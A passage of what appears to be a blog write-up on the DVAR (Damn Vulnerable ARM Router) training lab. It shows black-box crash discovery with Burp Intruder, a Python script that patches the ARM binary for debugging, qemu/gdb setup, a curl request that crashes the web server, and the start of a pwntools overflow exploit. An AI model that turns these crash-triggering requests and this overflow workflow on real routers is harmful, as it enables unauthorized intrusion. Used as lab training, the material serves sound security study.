+<p>As stated in <a href="https://en.wikipedia.org/wiki/Common_Gateway_Interface">cgi-bin wikipedia page</a>, when the use try to access a <code>.cgi</code> file under <code>cgi-bin/</code> directory, the server will try to execute the cgi script.</p>
+<h5 id="manual-investigation-1">Manual investigation<a href="#manual-investigation-1" class="hanchor" ariaLabel="Anchor">#</a> </h5>
+<p><img alt="Router Admin website" src="/img/dvar/admin_router.png"></p>
+<p>The webpage allows to configure the router. The configuration page has 2 main sections, <code>Setup</code> and <code>Status</code>, respectively allowing to configure internet and local network, and displays router and configuration informations (firmware version, network information, &hellip;).</p>
+<p>The <code>Setup</code> section allows:</p>
+<ul>
+<li><em>Internet Setup</em>
+<ul>
+<li>Internet connection type: <code>DHCP</code>, <code>Static IP</code>, <code>PPPoE</code>, <code>PPTP</code>, <code>L2TP</code>, <code>Lestra Cable</code></li>
+</ul>
+</li>
+<li><em>Network Setup</em>
+<ul>
+<li>Set Router IP (address &amp; mask)</li>
+<li>Set Router DNS</li>
+<li>Timezone</li>
+</ul>
+</li>
+</ul>
+<p>I tried to set up some arbitrary values and hit <code>Save Settings</code>. It fails saying connection was reset, likely indicating the server has closed the socket, or maybe crashed ? However, we can notice that the server is still responsive if we go back to default page.</p>
+<p>We keep the url that led to this behavior:</p>
+<pre tabindex="0"><code class="language-url" data-lang="url">http://192.168.100.2/basic.html?dhcp_end=149&amp;oldMtu=1500&amp;oldLanSubnet=0&amp;OldWanMode=0&amp;SDHCP1=192&amp;SDHCP2=168&amp;SDHCP3=1&amp;SDHCP4=100&amp;EDHCP1=192&amp;EDHCP2=168&amp;EDHCP3=1&amp;EDHCP4=150&amp;pd=&amp;now_proto=dhcp&amp;old_domain=&amp;chg_lanip=192.168.1.254&amp;_daylight_time=0&amp;wan_proto=0&amp;router_name=DVAR&amp;wan_hostname=&amp;wan_domain=&amp;mtu_enable=0&amp;lan_ipaddr_0=192&amp;lan_ipaddr_1=168&amp;lan_ipaddr_2=1&amp;lan_ipaddr_3=254&amp;lan_netmask=0&amp;lan_proto=Enable&amp;dhcp_start=100&amp;dhcp_num=50&amp;dhcp_lease=0&amp;dns0_0=0&amp;dns0_1=0&amp;dns0_2=0&amp;dns0_3=0&amp;dns1_0=0&amp;dns1_1=0&amp;dns1_2=0&amp;dns1_3=0&amp;dns2_0=0&amp;dns2_1=0&amp;dns2_2=0&amp;dns2_3=0&amp;wins_0=0&amp;wins_1=0&amp;wins_2=0&amp;wins_3=0&amp;time_zone=%28GMT%2B05%3A30%29+Bombay%2C+Calcutta%2C+Madras%2C+New+Delhi&amp;layout=en
+</code></pre><p>From here, we could guess that the server crash due to (might be other valid reasons):</p>
+<ul>
+<li>invalid handling of GET params (after <code>?</code>)</li>
+<li>buffer overflow on url (without proper validation of the url size on server side)</li>
+</ul>
+<p>We could try to send a GET request with a long dummy url like <code>/AAAAAAAAAAAAAAA...</code> and see if the server still crash.</p>
+<p><img alt="server crash confirmation" src="/img/dvar/server-crash-confirm.png"></p>
+<p>Then with burpsuite, we can automate the process of finding the url size that triggers the crash. We enable proxy mode in burp, send a dummy GET request, and forward it to intruder. In <code>Payloads</code> tab of intruder, I figured out we could use <code>Character blocks</code> as payload type and set the step to 1 to accurately search for the crashy url size (range 50-300).</p>
+<p><img alt="size of url crashing the server" src="/img/dvar/burpsuite-intruder-attack-url-length-crash.png"></p>
+<p>There is no apparent possibilities to trick the webserver and download the firmware. Thus, we will assume the firmware and it&rsquo;s filesystem have been succesfully retrieved by our red team operators (by some means we don&rsquo;t care about here).</p>
+<p><em>In the case where we can&rsquo;t retrieve the firmware but we know it&rsquo;s an arm linux and guess it&rsquo;s running with no PIE, no ASLR, no NX, and we also know the server respawn the process infinetely (as we saw), then we could spray the stack with nops and a shellcode, and try to bruteforce the return address offset and shellcode nop-land adress range. But it&rsquo;s not really straightforward.</em></p>
+<h3 id="white-box">white-box<a href="#white-box" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>access to root-fs</p>
+<p>Look the init script at <code>/etc/rc.local</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>echo &#39;*** starting ***&#39;
+</span></span><span style="display:flex;"><span>/usr/bin/miniweb
+</span></span><span style="display:flex;"><span>/usr/bin/lightsrv &amp;
+</span></span><span style="display:flex;"><span>exit 0
+</span></span></code></pre></div><p>Need to reverse these binaries, understand the network services they are related to, map out website actions to code in binaries, find vulns &amp; exploit.</p>
+<p>We can find the configuration file for the miniweb server at <code>/etc/miniweb.conf</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>ServerType Standalone
+</span></span><span style="display:flex;"><span>ServerPort 80
+</span></span><span style="display:flex;"><span>ServerRoot /www
+</span></span><span style="display:flex;"><span>DocumentRoot /www/htdocs
+</span></span><span style="display:flex;"><span>DefaultPage index.html
+</span></span><span style="display:flex;"><span>CgiBinDir /cgi-bin
+</span></span><span style="display:flex;"><span>CgiBinRoot /www/cgi-bin
+</span></span></code></pre></div><p>So <code>miniweb</code> is the router administration website. It is the main challenge of DVAR so we will first try to pwn this service before moving on to lights control website.</p>
+<h4 id="miniweb">miniweb<a href="#miniweb" class="hanchor" ariaLabel="Anchor">#</a> </h4>
+<p>We saw earlier that the router administration website allows the user to configure a lot of options. <strong>Sadly, the server crashes when we try to save our changes :(</strong></p>
+<h5 id="reversing-the-binary">Reversing the binary<a href="#reversing-the-binary" class="hanchor" ariaLabel="Anchor">#</a> </h5>
+<h6 id="first-pass">First pass<a href="#first-pass" class="hanchor" ariaLabel="Anchor">#</a> </h6>
+<p>We first conduct a fast analysis of the binary to identify the logic and map binary code attached to a particular action in the website.</p>
+<p>main setup server listenning on <code>SERVERPORT</code> port value (default is port 80), put server process to background and wait for connection. On client connect, it calls <code>serveconnection</code> with the client socket as only argument.</p>
+<p>In <code>serveconnection</code>:</p>
+<ol>
+<li>Read the client request</li>
+<li>Parse the first line of the request to extract method, url, and eventually params</li>
+<li>Continue if method is <code>GET</code></li>
+<li></li>
+</ol>
+<h6 id="finding-the-vuln">Finding the vuln<a href="#finding-the-vuln" class="hanchor" ariaLabel="Anchor">#</a> </h6>
+<p>todo</p>
+<h6 id="debug-miniweb-binary">Debug miniweb binary<a href="#debug-miniweb-binary" class="hanchor" ariaLabel="Anchor">#</a> </h6>
+<p>Binary try to bind to port <code>80</code>. Use following script to patch the binary <code>SERVERPORT</code> global variable. We also extend the script capabilities to be able to patch some code in the binary.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> lief
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NOP_VALUE_ARM32 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x00\xA0\xE1</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parse_int</span>(s):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> int(s, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Patch an ELF file&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    subcommands <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>add_subparsers(dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;command&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    network <span style="color:#f92672">=</span> subcommands<span style="color:#f92672">.</span>add_parser(<span style="color:#e6db74">&#34;network&#34;</span>)
+</span></span><span style="display:flex;"><span>    network<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;port&#34;</span>, type<span style="color:#f92672">=</span>parse_int, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Port number to write to file (will patch SERVERPORT global)&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    nop <span style="color:#f92672">=</span> subcommands<span style="color:#f92672">.</span>add_parser(<span style="color:#e6db74">&#34;nop&#34;</span>)
+</span></span><span style="display:flex;"><span>    nop<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;address&#39;</span>, type<span style="color:#f92672">=</span>parse_int, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Address to patch&#39;</span>)
+</span></span><span style="display:flex;"><span>    nop<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;size&#39;</span>, type<span style="color:#f92672">=</span>parse_int, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Number of bytes to patch&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    patch <span style="color:#f92672">=</span> subcommands<span style="color:#f92672">.</span>add_parser(<span style="color:#e6db74">&#34;patch&#34;</span>)
+</span></span><span style="display:flex;"><span>    patch<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;address&#39;</span>, type<span style="color:#f92672">=</span>parse_int, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Address to patch&#39;</span>)
+</span></span><span style="display:flex;"><span>    patch<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;value&#39;</span>, type<span style="color:#f92672">=</span>bytes<span style="color:#f92672">.</span>fromhex, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Value to patch (as hexstring)&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-f&#34;</span>, <span style="color:#e6db74">&#34;--elf&#34;</span>, type<span style="color:#f92672">=</span>str, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Path to the ELF file&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    elf <span style="color:#f92672">=</span> lief<span style="color:#f92672">.</span>parse(args<span style="color:#f92672">.</span>elf)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;network&#34;</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        sym <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>get_symbol(<span style="color:#e6db74">&#34;SERVERPORT&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        sym_vaddr<span style="color:#f92672">=</span> sym<span style="color:#f92672">.</span>value
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;@SERVERPORT =&#39;</span>, hex(sym_vaddr))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        section <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>section_from_virtual_address(sym_vaddr)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> section:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Could not find the section containing the symbol &#39;</span><span style="color:#e6db74">{</span>symbol_name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;.&#34;</span>)
+</span></span><span style="display:flex;"><span>            exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        sym_sec_offset <span style="color:#f92672">=</span> sym_vaddr <span style="color:#f92672">-</span> section<span style="color:#f92672">.</span>virtual_address
+</span></span><span style="display:flex;"><span>        binary_data <span style="color:#f92672">=</span> bytearray(section<span style="color:#f92672">.</span>content)
+</span></span><span style="display:flex;"><span>        orig_port <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(binary_data[sym_sec_offset:sym_sec_offset<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>], <span style="color:#e6db74">&#39;little&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Original port:&#34;</span>, orig_port)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;New port:&#34;</span>, args<span style="color:#f92672">.</span>port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        binary_data[sym_sec_offset:sym_sec_offset<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>port<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74">&#39;little&#39;</span>)   
+</span></span><span style="display:flex;"><span>        section<span style="color:#f92672">.</span>content <span style="color:#f92672">=</span> binary_data
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>command <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#34;nop&#34;</span>, <span style="color:#e6db74">&#34;patch&#34;</span>]:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        section <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>section_from_virtual_address(args<span style="color:#f92672">.</span>address)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> section:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Could not find the section containing the address </span><span style="color:#e6db74">{</span>args<span style="color:#f92672">.</span>address<span style="color:#e6db74">}</span><span style="color:#e6db74">.&#34;</span>)
+</span></span><span style="display:flex;"><span>            exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        sym_sec_offset <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>address <span style="color:#f92672">-</span> section<span style="color:#f92672">.</span>virtual_address
+</span></span><span style="display:flex;"><span>        binary_data <span style="color:#f92672">=</span> bytearray(section<span style="color:#f92672">.</span>content)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        size <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>size <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;nop&#34;</span> <span style="color:#66d9ef">else</span> len(args<span style="color:#f92672">.</span>value)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[orignal content]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> section<span style="color:#f92672">.</span>content[sym_sec_offset:sym_sec_offset<span style="color:#f92672">+</span>size]<span style="color:#f92672">.</span>hex())
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;patch&#34;</span>:
+</span></span><span style="display:flex;"><span>            binary_data[sym_sec_offset:sym_sec_offset<span style="color:#f92672">+</span>size] <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>value
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;nop&#34;</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>size <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#39;Unaligned size detected (must be 4 bytes aligned for arm32)</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">=&gt; discarding last &#39;</span> <span style="color:#f92672">+</span> args<span style="color:#f92672">.</span>size <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; bytes&#39;</span>)
+</span></span><span style="display:flex;"><span>            num_nops <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>size <span style="color:#f92672">//</span> <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            binary_data[sym_sec_offset:sym_sec_offset<span style="color:#f92672">+</span>(num_nops<span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>)] <span style="color:#f92672">=</span> NOP_VALUE_ARM32 <span style="color:#f92672">*</span> num_nops
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        section<span style="color:#f92672">.</span>content <span style="color:#f92672">=</span> binary_data
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        args<span style="color:#f92672">.</span>print_help()
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    outfile <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>elf <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.patched&#34;</span>
+</span></span><span style="display:flex;"><span>    elf<span style="color:#f92672">.</span>write(outfile)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;Patched file written to&#39;</span>, outfile)
+</span></span></code></pre></div><p>Now we want a way to perform dynamic analysis the binary. We will use <code>qemu</code> and <code>gdb</code>, and read the <a href="https://azeria-labs.com/arm-on-x86-qemu-user/">azeria labs tutorial</a> for emulating and debugging arm32 binaries.</p>
+<p>To emulate the binary and debug it with <code>gdb</code>, you first use <code>qemu-arm</code> to emulate the binary and open a gdb server on a specified port:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># retrieves the rootfs from emux DVAR files</span>
+</span></span><span style="display:flex;"><span>qemu-arm -g <span style="color:#ae81ff">1234</span> -L path/to/rootfs-arm <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -B 0x10000 ./miniweb.patched
+</span></span></code></pre></div><p>Then connect to the gdb server with <code>gdb-multiarch</code> in another terminal:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gdb-multiarch -q -nh -ex <span style="color:#e6db74">&#39;set architecture arm&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>                        -ex <span style="color:#e6db74">&#39;file ./miniweb.patched&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>                        -ex <span style="color:#e6db74">&#39;target remote localhost:1234&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>                        -ex <span style="color:#e6db74">&#39;layout split&#39;</span> -ex <span style="color:#e6db74">&#39;layout regs&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>                        -ex <span style="color:#e6db74">&#39;set solib-search-path ./rootfs-arm/lib&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>                        -ex <span style="color:#e6db74">&#39;set follow-fork-mode child&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>                        -ex <span style="color:#e6db74">&#39;set detach-on-fork off&#39;</span> 
+</span></span></code></pre></div><p>Try to <code>continue</code> the process in gdb to see there is still some caveats for debugging the binary:</p>
+<ul>
+<li><code>SERVERPORT</code> is overwritten by <code>readinconfig</code> (by reading its value from <code>/etc/miniweb.conf</code>)</li>
+<li>gdb doesn&rsquo;t follows child on <code>fork()</code>, nor stops parent after the call.</li>
+</ul>
+<p>So we are quite fucked trying to debug this binary. We have many options to temper with this (make parent &amp; child stop after fork with breakpoint + attach to child, patch the binary to remove related code parts, &hellip;)</p>
+<p>I decided to create a patch of the binary that I can easely debug. We will be using previous python script to do so. We create a <code>patch.sh</code> file with following content:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>FILEPATH<span style="color:#f92672">=</span>$1
+</span></span><span style="display:flex;"><span>FILEPATH_TMP<span style="color:#f92672">=</span><span style="color:#e6db74">${</span>FILEPATH<span style="color:#e6db74">}</span>.tmp
+</span></span><span style="display:flex;"><span>ROOTFS<span style="color:#f92672">=</span>$2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> patch_file<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>	python3 miniweb_patch.py $@
+</span></span><span style="display:flex;"><span>	mv <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>FILEPATH_TMP<span style="color:#e6db74">}</span><span style="color:#e6db74">.patched&#34;</span> $FILEPATH_TMP 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> $# -lt <span style="color:#ae81ff">2</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>	echo <span style="color:#e6db74">&#34;[patch.sh] Usage: </span>$0<span style="color:#e6db74"> &lt;file-to-patch&gt; &lt;rootfs-path&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>	exit <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cp $FILEPATH $FILEPATH_TMP
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Change SERVERPORT to 4444 (not really </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># needed anymore as we modify config file)</span>
+</span></span><span style="display:flex;"><span>patch_file -f $FILEPATH_TMP network <span style="color:#ae81ff">4444</span> 
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[patch.sh] overwritting server port in &#39;miniweb.conf&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>sed -i <span style="color:#e6db74">&#39;s/80/4444/g&#39;</span> $ROOTFS/etc/miniweb.conf
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nop forking process to background</span>
+</span></span><span style="display:flex;"><span>patch_file -f $FILEPATH_TMP nop 0x111F4 0x4c
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nop forking process to handle client</span>
+</span></span><span style="display:flex;"><span>patch_file -f $FILEPATH_TMP nop 0x112AC 0x8
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Patch check on fork() output</span>
+</span></span><span style="display:flex;"><span>patch_file -f $FILEPATH_TMP patch 0x112B4 000050e1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mv $FILEPATH_TMP <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>FILEPATH<span style="color:#e6db74">}</span><span style="color:#e6db74">.patched&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[patch.sh] Patched file written to </span><span style="color:#e6db74">${</span>FILEPATH<span style="color:#e6db74">}</span><span style="color:#e6db74">.patched&#34;</span>
+</span></span></code></pre></div><p>Then makes the script executable and run it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod +x patch.sh
+</span></span><span style="display:flex;"><span>./patch.sh ./miniweb ./rootfs-arm
+</span></span></code></pre></div><p>This should generate a <code>miniweb.patched</code> file that we can debug with gdb. First, we can try to send the specific HTTP request we found earlier, and which presumably crash the server. We run the binary with qemu (without starting gdb server) and send the request using curl:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>qemu-arm -L ./rootfs-arm <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>           -B 0x10000 ./miniweb.patched
+</span></span></code></pre></div><p>In another terminal send the buggy HTTP request:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#e6db74">&#39;http://localhost:4444/basic.html?dhcp_end=149&amp;oldMtu=1500&amp;oldLanSubnet=0&amp;OldWanMode=0&amp;SDHCP1=192&amp;SDHCP2=168&amp;SDHCP3=1&amp;SDHCP4=100&amp;EDHCP1=192&amp;EDHCP2=168&amp;EDHCP3=1&amp;EDHCP4=150&amp;pd=&amp;now_proto=dhcp&amp;old_domain=&amp;chg_lanip=192.168.1.254&amp;_daylight_time=0&amp;wan_proto=0&amp;router_name=DVAR&amp;wan_hostname=&amp;wan_domain=&amp;mtu_enable=0&amp;lan_ipaddr_0=192&amp;lan_ipaddr_1=168&amp;lan_ipaddr_2=1&amp;lan_ipaddr_3=254&amp;lan_netmask=0&amp;lan_proto=Enable&amp;dhcp_start=100&amp;dhcp_num=50&amp;dhcp_lease=0&amp;dns0_0=0&amp;dns0_1=0&amp;dns0_2=0&amp;dns0_3=0&amp;dns1_0=0&amp;dns1_1=0&amp;dns1_2=0&amp;dns1_3=0&amp;dns2_0=0&amp;dns2_1=0&amp;dns2_2=0&amp;dns2_3=0&amp;wins_0=0&amp;wins_1=0&amp;wins_2=0&amp;wins_3=0&amp;time_zone=%28GMT%2B05%3A30%29+Bombay%2C+Calcutta%2C+Madras%2C+New+Delhi&amp;layout=en&#39;</span>
+</span></span></code></pre></div><p>In the <code>qemu-arm</code> terminal, you should see the message <code>qemu: uncaught target signal 11 (Segmentation fault) - core dumped</code> indicating a crash of the server. In reality, it&rsquo;s the child process handling the client which crashes. It means the server will remain functional and not block while we exploit the vuln.</p>
+<h5 id="exploitation">Exploitation<a href="#exploitation" class="hanchor" ariaLabel="Anchor">#</a> </h5>
+<p>We will try to exploit this server using only ROPs :)</p>
+<p>Funny, but quite a mess lmao.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>req <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;GET /basic.html?&#39;</span> <span style="color:#f92672">+</span> cyclic(<span style="color:#ae81ff">500</span>, n<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; HTTP/1.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>req <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Host: 192.168.100.2</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>open(<span style="color:#e6db74">&#39;request.txt&#39;</span>, <span style="color:#e6db74">&#39;wb+&#39;</span>)<span style="color:#f92672">.</span>write(req)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>socat file:./request.txt tcp:localhost:4444
